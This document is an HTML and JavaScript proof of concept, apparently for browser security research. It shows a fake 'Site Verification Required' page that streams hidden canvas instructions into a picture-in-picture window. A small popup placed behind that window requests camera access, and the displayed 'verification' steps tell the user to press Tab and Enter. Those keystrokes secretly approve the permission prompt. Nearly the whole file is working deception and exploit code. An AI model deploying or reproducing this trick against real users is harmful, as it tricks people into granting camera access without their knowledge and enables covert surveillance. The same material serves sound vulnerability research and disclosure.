<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video PiP Overlap PoC</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }
    h2 { margin-bottom: 20px; }
    button {
      padding: 12px 28px;
      font-size: 16px;
      cursor: pointer;
      background-color: #0dd438;
      color: white;
      border: none;
      border-radius: 5px;
    }
    /* Hidden canvas + video — never visible to user */
    #hidden-video, #instruction-canvas {
      position: fixed;
      left: -9999px;
      top: -9999px;
    }
  </style>
</head>
<body>
  <h2>Site Verification Required</h2>
  <button id="verify-btn">Verify</button>
  <canvas id="instruction-canvas" width="640" height="480"></canvas>
  <video id="hidden-video" muted autoplay></video>
  <script>
    const canvas = document.getElementById('instruction-canvas');
    const ctx = canvas.getContext('2d');
    const video = document.getElementById('hidden-video');
    let popupWindow = null;
    let currentStep = 1;
    let animFrame = null;
    /* ══════ Canvas drawing ══════ */
    function drawStep(step) {
      ctx.fillStyle = '#f0f0f0';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#333';
      ctx.font = 'bold 28px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('2-Step Verification', canvas.width / 2, 60);
      ctx.strokeStyle = '#ccc';
      ctx.beginPath();
      ctx.moveTo(40, 80);
      ctx.lineTo(canvas.width - 40, 80);
      ctx.stroke();
      if (step === 1) {
        ctx.fillStyle = '#0dd438';
        ctx.font = 'bold 22px Arial';
        ctx.fillText('Step 1 of 2', canvas.width / 2, 130);
        ctx.fillStyle = '#222';
        ctx.font = '20px Arial';
        ctx.fillText('Press the Tab key 3 times,', canvas.width / 2, 200);
        ctx.fillText('then press Enter to continue.', canvas.width / 2, 235);
        drawKey(ctx, 200, 280, 'Tab');
        drawKey(ctx, 280, 280, 'Tab');
        drawKey(ctx, 360, 280, 'Tab');
        drawArrow(ctx, 400, 295, 430, 295);
        drawKey(ctx, 440, 280, 'Enter');
        pulse(ctx, canvas.width / 2, 380);
        ctx.fillStyle = '#555';
        ctx.font = '14px Arial';
        ctx.fillText('Waiting for input…', canvas.width / 2, 420);
      } else if (step === 2) {
        ctx.fillStyle = '#0dd438';
        ctx.font = 'bold 22px Arial';
        ctx.fillText('Step 2 of 2', canvas.width / 2, 130);
        ctx.fillStyle = '#222';
        ctx.font = '20px Arial';
        ctx.fillText('Press Enter twice to', canvas.width / 2, 200);
        ctx.fillText('complete verification.', canvas.width / 2, 235);
        drawKey(ctx, 250, 280, 'Enter');
        drawKey(ctx, 340, 280, 'Enter');
        pulse(ctx, canvas.width / 2, 370);
        ctx.fillStyle = '#555';
        ctx.font = '14px Arial';
        ctx.fillText('Almost done…', canvas.width / 2, 410);
      } else if (step === 3) {
        ctx.fillStyle = '#0dd438';
        ctx.font = 'bold 26px Arial';
        ctx.fillText('✓ Verified!', canvas.width / 2, 220);
        ctx.fillStyle = '#555';
        ctx.font = '18px Arial';
        ctx.fillText('You may close this window.', canvas.width / 2, 265);
      }
    }
    function drawKey(ctx, x, y, label) {
      const w = label === 'Enter' ? 70 : 55;
      ctx.fillStyle = '#fff';
      ctx.strokeStyle = '#aaa';
      ctx.lineWidth = 2;
      roundRect(ctx, x, y, w, 36, 6);
      ctx.fill();
      ctx.stroke();
      ctx.fillStyle = '#333';
      ctx.font = 'bold 14px Arial';
      ctx.textAlign = 'center';
      ctx.fillText(label, x + w / 2, y + 23);
    }
    function drawArrow(ctx, x1, y1, x2, y2) {
      ctx.strokeStyle = '#999';
      ctx.lineWidth = 2;
      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(x2, y2);
      ctx.stroke();
      ctx.beginPath();
      ctx.moveTo(x2, y2);
      ctx.lineTo(x2 - 6, y2 - 4);
      ctx.lineTo(x2 - 6, y2 + 4);
      ctx.closePath();
      ctx.fillStyle = '#999';
      ctx.fill();
    }
    function pulse(ctx, x, y) {
      const alpha = 0.5 + 0.5 * Math.sin(Date.now() / 300);
      ctx.fillStyle = `rgba(13, 212, 56, ${alpha})`;
      ctx.beginPath();
      ctx.arc(x, y, 12, 0, Math.PI * 2);
      ctx.fill();
    }
    function roundRect(ctx, x, y, w, h, r) {
      ctx.beginPath();
      ctx.moveTo(x + r, y);
      ctx.lineTo(x + w - r, y);
      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
      ctx.lineTo(x + w, y + h - r);
      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
      ctx.lineTo(x + r, y + h);
      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
      ctx.lineTo(x, y + r);
      ctx.quadraticCurveTo(x, y, x + r, y);
      ctx.closePath();
    }
    /* ══════ Animation loop ══════ */
    function animate() {
      drawStep(currentStep);
      animFrame = requestAnimationFrame(animate);
    }
    /* ══════ Main trigger ══════ */
    document.getElementById('verify-btn').addEventListener('click', async () => {
      currentStep = 1;
      animate();
      // Canvas → video stream → PiP
      const stream = canvas.captureStream(30);
      video.srcObject = stream;
      await video.play();
      try {
        await video.requestPictureInPicture();
      } catch (e) {
        console.error('PiP failed:', e);
        return;
      }
      // Open tiny popup BEHIND the PiP — it auto-requests camera
      popupWindow = window.open(
        'permission.html',
        'permPopup',
        'width=100,height=100,left=850,top=650'
      );
      // Give focus back to popup so keystrokes reach the permission dialog
      setTimeout(() => {
        if (popupWindow) popupWindow.focus();
      }, 300);
    });
    /* ══════ Keystroke tracking (on the main window) ══════ */
    // We DON'T intercept keys here — the Tab/Enter keystrokes go
    // directly to the popup's permission dialog.
    // We just poll the popup to detect when it closes (= permission granted).
    setInterval(() => {
      if (popupWindow && popupWindow.closed) {
        // Popup closed itself → camera was granted
        if (currentStep < 3) {
          currentStep = 3;
          // Close PiP after showing "Verified"
          setTimeout(() => {
            if (document.pictureInPictureElement) {
              document.exitPictureInPicture().catch(() => {});
            }
            cancelAnimationFrame(animFrame);
          }, 1500);
        }
        popupWindow = null;
      }
    }, 500);
    // If user manually closes PiP, clean up
    video.addEventListener('leavepictureinpicture', () => {
      cancelAnimationFrame(animFrame);
      if (popupWindow) popupWindow.close();
    });
  </script>
</body>
</html>
